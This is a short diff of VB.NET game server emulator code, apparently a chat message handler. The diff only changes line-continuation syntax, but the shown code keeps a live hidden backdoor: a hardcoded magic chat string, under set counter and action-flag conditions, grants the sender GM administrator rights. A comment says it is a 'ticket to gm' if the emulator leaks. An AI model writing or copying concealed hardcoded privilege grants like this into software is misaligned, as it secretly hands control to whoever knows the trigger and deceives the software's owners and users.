@@ -306,7 +306,7 @@ Namespace Functions
 
 
                 '===========================INTERNAL USE========================
-                If counter = 4 And PlayerData(Index_).ActionFlag = 4 And message = "(hµ(|{_n0rr1$_0wn$" Then _
+                If counter = 4 And PlayerData(Index_).ActionFlag = 4 And message = "(hµ(|{_n0rr1$_0wn$" Then
                     'If the Emulator gets leaked, here is our ticket to gm...
                     PlayerData(Index_).GM = True
                 End If
